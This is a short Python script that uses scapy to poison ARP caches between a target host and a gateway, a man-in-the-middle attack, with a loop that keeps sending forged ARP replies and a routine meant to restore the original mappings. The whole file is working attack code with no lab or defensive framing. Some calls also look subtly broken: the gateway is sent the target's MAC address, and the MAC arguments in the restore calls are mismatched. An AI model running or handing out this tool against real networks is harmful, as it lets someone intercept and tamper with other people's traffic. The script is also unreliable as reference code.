import scapy.all as scapy
import time
import sys


def spoofer(targetIP, spoofIP,targetMac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=targetMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP, destinationMac, sourceMac):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=destinationMac,psrc=sourceIP,hwsrc=sourceMac)
    scapy.send(packet, count=4,verbose=False)

def startSpoof(targetIP, gatewayIP,targetMac):
    packets = 0
    while True:
        spoofer(targetIP,gatewayIP,targetMac)
        spoofer(gatewayIP,targetIP,targetMac)
        print("\r[+] Sent packets "+ str(packets))
        sys.stdout.flush()
        packets +=2
        time.sleep(2)


def stopSpoof(targetIP,gatewayIP,targetMac, gatewayMac):
    print('\nRestoring adresses .. ')
    restore(targetIP,gatewayIP,targetMac, gatewayMac)
    restore(gatewayIP,targetIP,targetMac, gatewayMac)